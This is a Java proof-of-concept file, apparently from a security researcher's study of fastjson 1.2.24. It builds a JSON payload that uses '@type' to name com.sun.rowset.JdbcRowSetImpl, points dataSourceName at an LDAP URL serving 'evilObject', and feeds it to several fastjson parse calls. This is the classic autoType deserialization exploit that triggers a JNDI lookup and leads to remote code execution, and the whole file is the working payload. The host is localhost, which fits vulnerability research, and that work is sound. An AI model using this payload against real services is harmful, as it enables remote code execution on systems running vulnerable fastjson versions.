package org.h3rmesk1t.Fastjson.fastjson24;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/8 12:25 上午
 */
public class POC2 {

    public static void main(String[] args) {

        String jsonString = "{\n" +
                "\t\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "\t\"dataSourceName\":\"ldap://127.0.0.1:8888/evilObject\",\n" +
                "\t\"autoCommit\":true\n" +
                "}";
        JSON.parse(jsonString);
        JSON.parseObject(jsonString);
        JSON.parseObject(jsonString, Feature.SupportNonPublicField);
    }
}
